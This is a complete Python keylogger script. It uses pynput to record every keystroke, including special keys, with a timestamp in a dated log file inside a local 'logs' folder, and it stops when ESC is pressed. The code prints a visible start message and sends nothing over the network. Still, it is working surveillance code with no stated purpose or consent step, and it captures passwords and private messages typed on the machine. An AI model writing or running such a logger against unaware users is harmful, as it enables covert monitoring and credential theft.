import os
from pynput import keyboard
from datetime import datetime

# Make logs folder if not present
if not os.path.exists("logs"):
    os.makedirs("logs")

# Log file with current date
log_filename = f"logs/keylog_{datetime.now().strftime('%Y-%m-%d')}.txt"

def on_press(key):
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    with open(log_filename, "a") as log_file:
        try:
            log_file.write(f"{timestamp} - {key.char}\n")
        except AttributeError:
            log_file.write(f"{timestamp} - [{key.name.upper()}]\n")

def on_release(key):
    if key == keyboard.Key.esc:
        print("ESC pressed. Exiting keylogger.")
        return False

if __name__ == "__main__":
    print("Keylogger started. Press ESC to stop.")
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
